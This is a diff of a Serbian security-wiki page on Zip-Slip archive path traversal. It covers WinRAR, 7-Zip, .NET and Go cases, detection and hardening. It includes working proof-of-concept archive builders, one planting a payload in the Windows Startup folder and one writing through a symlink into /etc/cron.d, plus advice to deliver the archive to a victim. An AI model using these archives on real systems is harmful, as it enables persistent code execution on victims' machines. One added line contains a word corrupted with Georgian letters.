@@ -4,23 +4,23 @@
 
 ## Pregled
 
-Mnogi formati arhiva (ZIP, RAR, TAR, 7-ZIP itd.) omogućavaju da svaki unos sadrži sopstvenu **internu putanju**. Kada alat za raspakivanje slepo poštuje tu putanju, posebno ime datoteke koje sadrži `..` ili **apsolutnu putanju** (npr. `C:\Windows\System32\`) biće zapisano izvan direktorijuma koji je korisnik izabrao.
-Ova klasa ranjivosti je poznata kao *Zip-Slip* ili **path traversal pri raspakivanju arhive**.
+Mnogi arhivski formati (ZIP, RAR, TAR, 7-ZIP itd.) omogućavaju da svaki unos sadrži sopstvenu **internu putanju**. Kada alat za ekstrakciju slepo poštuje tu putanju, posebno ime datoteke koje sadrži `..` ili **apsolutnu putanju** (npr. `C:\Windows\System32\`) biće zapisano izvan direktorijuma koji je korisnik izabrao.
+Ova klasa ranjivosti je opšte poznata kao *Zip-Slip* ili **archive extraction path traversal**.<sup>[[6]](#references)</sup>
 
-Posledice se kreću od prepisivanja proizvoljnih datoteka do direktnog postizanja **remote code execution (RCE)** ubacivanjem payload-a na lokaciju sa **auto-run** funkcijom, kao što je Windows *Startup* folder.
+Posledice se kreću od prepisivanja proizvoljnih datoteka do direktnog postizanja **remote code execution (RCE)** ubacivanjem payload-a na lokaciju za **auto-run**, kao što je Windows *Startup* folder.
 
 ## Osnovni uzrok
 
 1. Napadač kreira arhivu u kojoj jedno ili više zaglavlja datoteka sadrže:
-* Sekvence relativnog traversal-a (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+* Relativne traversal sekvence (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
 * Apsolutne putanje (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
-* Ili posebno izrađene **symlinks** koji se razrešavaju izvan ciljnog direktorijuma (uobičajeno kod ZIP/TAR na *nix* sistemima).
-2. Žrtva raspakuje arhivu pomoću ranjivog alata koji veruje ugrađenoj putanji (ili prati symlinks), umesto da je sanitizuje ili forsira raspakivanje unutar izabranog direktorijuma.
-3. Datoteka se zapisuje na lokaciju pod kontrolom napadača i izvršava/učitava sledeći put kada sistem ili korisnik aktivira tu putanju.
+* Ili posebno kreirane **symlink-ove** koji se razrešavaju izvan ciljnog direktorijuma (uobičajeno u ZIP/TAR formatima na *nix sistemima).
+2. Žrtva ekstraktuje arhivu pomoću ranjivog alata koji veruje ugrađenoj putanji (ili prati symlink-ove), umesto da je sanitizuje ili prisili ekstrakciju unutar izabranog direktorijuma.
+3. Datoteka se upisuje na lokaciju pod kontrolom napadača i izvršava/učitava sledeći put kada sistem ili korisnik aktivira tu putanju.
 
 ### .NET `Path.Combine` + `ZipArchive` traversal
 
-Uobičajen .NET anti-pattern je kombinovanje predviđenog odredišta sa `user-controlled` vrednošću `ZipArchiveEntry.FullName` i raspakivanje bez normalizacije putanje:<sup>[[4]](#references)</sup>
+Uobičajen .NET anti-pattern je kombinovanje predviđenog odredišta sa **user-controlled** `ZipArchiveEntry.FullName` vrednošću i ekstrakcija bez normalizacije putanje:<sup>[[4]](#references)</sup>
 ```csharp
 using (var zip = ZipFile.OpenRead(zipPath))
 {
@@ -31,25 +31,25 @@ entry.ExtractToFile(dest);
 }
 }
 ```
-- Ako `entry.FullName` počinje sa `..\\`, omogućava traversal; ako je **absolute path**, leva komponenta se u potpunosti odbacuje, što kao extraction identity omogućava **arbitrary file write**.
+- Ako `entry.FullName` počinje sa `..\\`, dolazi do path traversal-a; ako je **absolute path**, leva komponenta se u potpunosti odbacuje, čime se kao identitet ekstrakcije dobija **arbitrary file write**.
 - Proof-of-concept archive za upis u susedni `app` direktorijum koji nadgleda scheduled scanner:
 ```python
 import zipfile
 with zipfile.ZipFile("slip.zip", "w") as z:
 z.writestr("../app/0xdf.txt", "ABCD")
 ```
-Ubaciivanje tog ZIP-a u nadzirano prijemno sanduče rezultira fajlom `C:\samples\app\0xdf.txt`, čime se dokazuje traversal izvan direktorijuma `C:\samples\queue\` i omogućavaju naknadni primitives (npr. DLL hijacks).
+Ubაცivanje tog ZIP-a u nadgledano prijemno sanduče rezultira fajlom `C:\samples\app\0xdf.txt`, čime se dokazuje traversal izvan `C:\samples\queue\` i omogućavaju naknadni primitives (npr. DLL hijacks).
 
 ## Primer iz stvarnog sveta – WinRAR ≤ 7.12 (CVE-2025-8088)
 
-WinRAR za Windows (uključujući CLI alate `rar` / `unrar`, DLL i prenosivi source) nije uspevao da validira nazive fajlova tokom ekstrakcije.
-Maliciozni RAR archive koji sadrži stavku poput:
+WinRAR za Windows (uključujući `rar` / `unrar` CLI, DLL i portable source) nije uspevao da validira nazive fajlova tokom ekstrakcije.  
+Maliciozni RAR archive koji sadrži unos kao što je:
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-bi završio **izvan** izabranog izlaznog direktorijuma i unutar korisničkog foldera *Startup*. Nakon prijavljivanja, Windows automatski izvršava sve što se tamo nalazi, čime se obezbeđuje *persistent* RCE.<sup>[[5]](#references)</sup>
+bi završilo **izvan** izabranog izlaznog direktorijuma i unutar korisničke fascikle *Startup*. Nakon prijavljivanja, Windows automatski izvršava sve što se tamo nalazi, čime se obezbeđuje *persistent* RCE.<sup>[[5]](#references)</sup>
 
-### Kreiranje PoC arhive (Linux/Mac)
+### Izrada PoC arhive (Linux/Mac)
 ```bash
 # Requires rar >= 6.x
 mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@@ -61,16 +61,16 @@ Korišćene opcije:
 
 Isporučite `evil.rar` žrtvi i uputite je da ga raspakuje pomoću ranjive verzije WinRAR-a.
 
-### Uočena eksploatacija u praksi
+### Uočena Eksploatacija u Praksi
 
-ESET je prijavio spear-phishing kampanje grupe RomCom (Storm-0978/UNC2596) koje su sadržale RAR arhive koje zloupotrebljavaju CVE-2025-8088 za instaliranje prilagođenih backdoor-a i olakšavanje ransomware operacija.<sup>[[5]](#references)</sup>
+ESET je prijavio spear-phishing kampanje grupe RomCom (Storm-0978/UNC2596) u kojima su RAR arhive iskorišćene za zloupotrebu CVE-2025-8088 radi postavljanja prilagođenih backdoors i olakšavanja ransomware operacija.<sup>[[5]](#references)</sup>
 
-## Noviji slučajevi (2024–2025)
+## Noviji Slučajevi (2024–2025)
 
 ### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
-* **Greška**: ZIP unosi koji su **simboličke veze** dereferencirani su tokom raspakivanja, što napadačima omogućava izlazak iz odredišnog direktorijuma i prepisivanje proizvoljnih putanja. Interakcija korisnika svodi se samo na *otvaranje/raspakivanje* arhive.<sup>[[1]](#references)</sup>
-* **Pogođene verzije**: 7-Zip 21.02–24.09 (Windows i Linux build-ovi). Ispravljeno u verziji **25.00** (jul 2025) i novijim verzijama.
-* **Putanja uticaja**: Prepisivanje lokacija `Start Menu/Programs/Startup` ili lokacija koje pokreću servise → kod se izvršava pri sledećoj prijavi ili ponovnom pokretanju servisa.
+* **Greška**: ZIP entries koji su **symbolic links** dereferencirani su tokom raspakivanja, što je napadačima omogućavalo da izađu iz odredišnog direktorijuma i prebrišu proizvoljne putanje. Interakcija korisnika svodi se samo na *otvaranje/raspakivanje* arhive.<sup>[[1]](#references)</sup>
+* **Obuhvaćene verzije**: 7-Zip 21.02–24.09 (Windows i Linux builds). Ispravljeno u verziji **25.00** (jul 2025) i novijim verzijama.
+* **Putanja uticaja**: Prepisivanje lokacija `Start Menu/Programs/Startup` ili lokacija koje pokreću servise → code se izvršava pri sledećem prijavljivanju ili restartovanju servisa.
 * **Brzi PoC (Linux)**:
 ```bash
 mkdir -p out
@@ -78,12 +78,12 @@ ln -s /etc/cron.d evil
 zip -y exploit.zip evil   # -y preserves symlinks
 7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
 ```
-Na zakrpljenoj verziji `/etc/cron.d` neće biti izmenjen; symlink se raspakuje kao veza unutar `/tmp/target`.
+Na zakrpljenoj verziji `/etc/cron.d` neće biti izmenjen; symlink se raspakuje kao link unutar `/tmp/target`.
 
 ### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
-* **Greška**: `archiver.Unarchive()` prati `../` i symlink ZIP unose, upisujući podatke izvan `outputDir`.<sup>[[2]](#references)</sup>
-* **Pogođeno**: `github.com/mholt/archiver` ≤ 3.5.1 (projekat je sada zastareo).
-* **Ispravka**: Pređite na `mholt/archives` ≥ 0.1.0 ili implementirajte provere kanonske putanje pre upisivanja.
+* **Greška**: `archiver.Unarchive()` prati `../` i symlinked ZIP entries, upisujući podatke izvan `outputDir`.<sup>[[2]](#references)</sup>
+* **Obuhvaćeno**: `github.com/mholt/archiver` ≤ 3.5.1 (projekat je sada deprecated).
+* **Ispravka**: Pređite na `mholt/archives` ≥ 0.1.0 ili implementirajte provere canonical-path pre upisivanja.
 * **Minimalna reprodukcija**:
 ```go
 // go test . with archiver<=3.5.1
@@ -91,26 +91,26 @@ archiver.Unarchive("exploit.zip", "/tmp/safe")
 // exploit.zip holds ../../../../home/user/.ssh/authorized_keys
 ```
 
-## Saveti za detekciju
+## Saveti za Detekciju
 
-* **Statička inspekcija** – Izlistajte unose arhive i označite svaki naziv koji sadrži `../`, `..\\`, *apsolutne putanje* (`/`, `C:`) ili unose tipa *symlink* čiji cilj izlazi iz direktorijuma za raspakivanje.
-* **Kanonikalizacija** – Uverite se da `realpath(join(dest, name))` i dalje počinje sa `dest`. U suprotnom odbijte unos.<sup>[[3]](#references)</sup>
-* **Raspakivanje u sandbox-u** – Dekompresujte u privremeni direktorijum za jednokratnu upotrebu pomoću *bezbednog* extractora (npr. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i proverite da rezultujuće putanje ostaju unutar direktorijuma.
-* **Nadgledanje endpoint-a** – Upozorite na nove izvršne datoteke upisane u lokacije `Startup`/`Run`/`cron` ubrzo nakon što je arhivu otvorio WinRAR/7-Zip/itd.
+* **Static inspection** – Izlistajte archive entries i označite svaki naziv koji sadrži `../`, `..\\`, *absolute paths* (`/`, `C:`) ili entries tipa *symlink* čiji target vodi izvan extraction direktorijuma.
+* **Canonicalisation** – Uverite se da `realpath(join(dest, name))` i dalje počinje sa `dest`. U suprotnom odbijte unos.<sup>[[3]](#references)</sup>
+* **Sandbox extraction** – Raspakujte u privremeni direktorijum za jednokratnu upotrebu pomoću *safe* extractora (npr. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i proverite da rezultujuće putanje ostaju unutar direktorijuma.
+* **Endpoint monitoring** – Generišite upozorenje kada se novi executables upišu u lokacije `Startup`/`Run`/`cron` ubrzo nakon što je arhivu otvorio WinRAR/7-Zip/itd.
 
-## Ublažavanje i hardening
+## Ublažavanje i Ojačavanje
 
-1. **Ažurirajte extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementiraju sanitizaciju putanja/symlink-ova. Nijedan od ova dva alata i dalje nema automatsko ažuriranje.
+1. **Ažurirajte extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementiraju sanitizaciju putanja/symlink-ova. Nijedan od ova dva alata i dalje nema auto-update.
 2. Kad god je moguće, raspakujte arhive uz opciju “**Do not extract paths**” / “**Ignore paths**”.
 3. Na Unix-u smanjite privilegije i montirajte **chroot/namespace** pre raspakivanja; na Windows-u koristite **AppContainer** ili sandbox.
-4. Ako pišete prilagođeni kod, normalizujte pomoću `realpath()`/`PathCanonicalize()` **pre** kreiranja/upisivanja i odbijte svaki unos koji izlazi iz odredišta.
+4. Ako pišete prilagođeni code, normalizujte pomoću `realpath()`/`PathCanonicalize()` **pre** kreiranja/upisivanja i odbijte svaki entry koji izlazi iz odredišta.
 
-## Dodatni pogođeni / istorijski slučajevi
+## Dodatni Obuhvaćeni / Istorijski Slučajevi
 
-* 2018 – Veliko *Zip-Slip* upozorenje kompanije Snyk koje je obuhvatilo mnoge Java/Go/JS biblioteke.
-* 2023 – 7-Zip CVE-2023-4011, slično traversal ponašanje tokom spajanja pomoću `-ao`.
-* 2025 – HashiCorp `go-slug` (CVE-2025-0377), traversal tokom TAR raspakivanja slug-ova (zakrpa u verziji v1.2).
-* Bilo koja prilagođena logika raspakivanja koja ne pozove `PathCanonicalize` / `realpath` pre upisivanja.
+* 2018 – Veliko *Zip-Slip* upozorenje kompanije Snyk koje je obuhvatilo mnoge Java/Go/JS libraries.<sup>[[6]](#references)</sup>
+* 2023 – 7-Zip CVE-2023-4011, sličan traversal tokom `-ao` merge operacije.
+* 2025 – HashiCorp `go-slug` (CVE-2025-0377), TAR extraction traversal u slug-ovima (zakrpa u verziji v1.2).<sup>[[7]](#references)</sup>
+* Svaka prilagođena extraction logika koja ne poziva `PathCanonicalize` / `realpath` pre upisivanja.
 
 ## Reference
 
@@ -119,5 +119,7 @@ archiver.Unarchive("exploit.zip", "/tmp/safe")
 - [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
 - [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 - [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
+- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
+- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)
 
 {{#include ../banners/hacktricks-training.md}}
